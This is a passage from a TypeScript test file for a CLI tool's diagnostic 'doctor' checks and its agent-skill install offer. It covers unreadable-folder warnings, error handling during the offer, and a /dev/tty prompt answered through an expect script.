  const asRoot = process.getuid?.() === 0;
  await chmod(folder, 0o000);
  try {
    for (const [check, named] of [
      ...(asRoot
        ? []
        : ([[await doctorLine(unreadable.home), folder]] as const)),
      [await doctorLine(fileHome.home), join(fileHome.home, ".claude")],
      [await doctorLine(fileHome.home, configFile), configFile],
    ] as const) {
      expect(check).toMatchObject({ check: "agent skill", status: "warning" });
      expect(check.detail).toContain(named);
      expect(check.detail).toMatch(/EACCES|ENOTDIR/);
      expect(check.detail).not.toMatch(UNSAFE_TEXT);
    }
    const report = await inspectDoctor({
      repository,
      version: "0.1.0",
      home: asRoot ? fileHome.home : unreadable.home,
    });
    expect(report.exitCode).toBe(baseline.exitCode);
    expect(report.checks.map((check) => check.check)).toEqual(
      baseline.checks.map((check) => check.check),
    );
    expect(
      report.checks.find((check) => check.check === "agent skill")?.status,
    ).toBe("warning");
  } finally {
    await chmod(folder, 0o755);
  }
});

test("an offer that stopped on an error is not remembered, so setup asks next time", async () => {
  const repository = await scratch("skills-offer-error");
  const h = await harness(realSkill);
  let asked = 0;
  const context = (fail: boolean) =>
    h.context({
      isTerminal: true,
      ask: async () => {
        asked += 1;
        return "n";
      },
      source: async () => {
        if (fail) throw new Error("the skill files can't be read");
        return { found: true, location: "test", bundle: await realSkill() };
      },
    });
  const stateDirectory = join(repository, "state");
  await offerSkillsAfterSetup({ stateDirectory, context: context(true) });
  expect(h.output()).toContain(
    "The skill offer stopped: the skill files can't be read",
  );
  expect(
    await lstat(join(stateDirectory, "skills-offered.json")).catch(() => null),
  ).toBe(null);
  await offerSkillsAfterSetup({ stateDirectory, context: context(false) });
  expect(asked).toBe(1);
  expect(
    (await lstat(join(stateDirectory, "skills-offered.json"))).isFile(),
  ).toBe(true);
});

// Why: the installer points the offer's input at /dev/tty, so it can ask when it was piped in from
// curl. Bun's stdin stream watches its descriptor with kqueue, which macOS refuses for /dev/tty
// (EINVAL), so the offer used to fail there and install nothing. expect(1) plays the person at a
// real terminal; macOS ships it, and the case is skipped where it is missing.
test.skipIf(!existsSync("/usr/bin/expect"))(
  "the offer reads its answer from /dev/tty, as the installer gives it",
  async () => {
    const script = join(await scratch("skills-tty-script"), "ask.exp");
    await writeFile(
      script,
      [
        "set timeout 60",
        "set answer [lindex $argv 0]",
        "set question {[y/N] }",
        "spawn -noecho {*}[lrange $argv 1 end]",
        "expect {",
        '  -exact $question { send "$answer\\r"; exp_continue }',
        "  eof",
        "}",
        "catch wait result",
        "exit [lindex $result 3]",
        "",
      ].join("\n"),
    );
    const cli = resolve(import.meta.dir, "../src/cli.ts");
    for (const [answer, installed] of [
      ["y", true],
      ["n", false],
    ] as const) {
      const home = await scratch(`skills-tty-${answer}`);
      const child = Bun.spawn(
        [
          "/usr/bin/expect",
          script,
          answer,
          "/bin/sh",
          "-c",
          `"$0" "$1" skills install --offer </dev/tty`,
          process.execPath,
          cli,
        ],
        {
          env: {
            HOME: home,
            PATH: "/usr/bin:/bin",
            TMPDIR: tmpdir(),
            LANG: "C",
            TERM: "xterm",
          },
          stdout: "pipe",
          stderr: "pipe",
        },
      );
      const [output, code] = await Promise.all([
        new Response(child.stdout).text(),
        child.exited,
      ]);
      expect(code, output).toBe(0);
      expect(output).not.toContain("EINVAL");
      expect(output).toContain(
        installed ? "Installed the Neuve skill" : "Not installed.",
      );
      expect(existsSync(join(home, ".agents/skills/neuve/SKILL.md"))).toBe(
        installed,
      );
    }
  },
  120_000,
);
